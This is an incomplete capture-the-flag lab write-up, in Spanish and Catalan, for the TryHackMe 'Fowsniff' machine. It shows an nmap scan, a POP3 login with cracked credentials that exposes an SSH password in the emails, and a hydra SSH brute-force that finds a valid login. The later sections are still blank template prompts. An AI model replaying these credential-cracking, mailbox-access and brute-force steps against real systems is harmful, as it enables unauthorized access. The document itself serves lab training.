# FownSniff

Plataforma: TryHackMe
OS: Linux
Level: Easy
Status: In progress
Complete: No
Created time: 4 de diciembre de 2024 21:45

## Notas

## Recopilación de información

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

PORT    STATE SERVICE VERSION

22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)

80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|*http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry
|*/

110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: UIDL CAPA AUTH-RESP-CODE SASL(PLAIN) TOP USER RESP-CODES PIPELINING

143/tcp open  imap    Dovecot imapd
|_imap-capabilities: ID more IDLE Pre-login LITERAL+ LOGIN-REFERRALS SASL-IR ENABLE have listed post-login capabilities OK IMAP4rev1 AUTH=PLAINA0001
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

- **Identificación de vulnerabilidades**
    - 22/SSH
    - 80/HTTP
    - 110/POP3
    - 143/ IMAP

Twiteer de Fownsniff

users i password hash md5: desencriptat a Crackstation

Accedir per pop3 (nc IP 110)

```bash
nc 10.10.202.197 110
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
retr1
-ERR Unknown command: RETR1
list
+OK 2 messages:
1 1622
2 1280
.
retr 1
+OK 1622 octets
Return-Path: [stone@fowsniff](mailto:stone@fowsniff)
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: [20180313185107.0FA3916A@fowsniff](mailto:20180313185107.0FA3916A@fowsniff)
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

User: S1ck3nBluff

Password: secureshell

```bash
retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: *baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

user : From: *baksteen@fowsniff

```

## Explotación

### Explotación 1

```bash
hydra -L user.txt -P pass.txt -f 10.10.202.197 ssh -t 4
login: baksteen   password: S1ck3nBluff+secureshell

```

### Explotación 2

Ejemplo: Encontramos el servidio FTP en el puerto 21 con capacidad de acceso son usuario anonymous.

Encontramos un archivo con …

### Explotación 3

## Explotación posterior

<aside>
💡 En esta sección, debes detallar los pasos que seguiste después de explotar con éxito la máquina. Esto incluye cosas como:

</aside>

### Escalada de privilegios

## Conclusión

<aside>
💡 En esta sección, debes proporcionar un resumen de la máquina para cuando tengas que volver a ella, puedas saber conocer de forma rápida de que se trataba

</aside>